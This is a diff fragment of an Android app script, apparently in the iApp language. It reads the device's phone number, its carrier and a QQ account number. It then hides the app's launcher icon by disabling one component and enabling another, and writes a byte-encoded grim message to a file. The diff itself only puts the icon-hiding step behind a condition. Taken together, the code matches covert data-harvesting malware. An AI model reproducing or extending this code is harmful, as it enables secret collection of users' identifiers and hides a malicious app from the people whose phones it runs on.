@@ -207,7 +207,7 @@ t(){
         ss(sss.qq+"\nQQ号:"+qq,sss.qq)
       }
     }
-  }
+  }  
         java(管理器,activity,"android.app.Activity.getSystemService","String","phone")
         java(phone,管理器,"android.telephony.TelephonyManager.getLine1Number")
         java(Operator,管理器,"android.telephony.TelephonyManager.getNetworkOperatorName")
@@ -217,12 +217,14 @@ t(){
         ufnsui(){
         tw(info)
         }
+        f(checked==true){
         java(管理器,activity,"Context.getPackageManager")
         javanew(组件名,"android.content.ComponentName","Context",activity,"String","com.iapp.app.logoActivity")
         java(null,管理器,"android.content.pm.PackageManager.setComponentEnabledSetting","android.content.ComponentName",组件名,"int",2,"int",1)
         java(管理器,activity,"Context.getPackageManager")
         javanew(组件名,"android.content.ComponentName","Context",activity,"String","aa.Test")
         java(null,管理器,"android.content.pm.PackageManager.setComponentEnabledSetting","android.content.ComponentName",组件名,"int",1,"int",1)
+       }
       }f(aaaaaaaa=="false"){
         btoo("utf-8","73 32 111 110 108 121 32 104 111 112 101 32 109 121 32 100 101 97 116 104 32 105 115 32 119 111 114 116 104 32 109 111 114 101 32 116 104 97 110 32 109 121 32 108 105 102 101",dead)
         fw(Ace,dead)
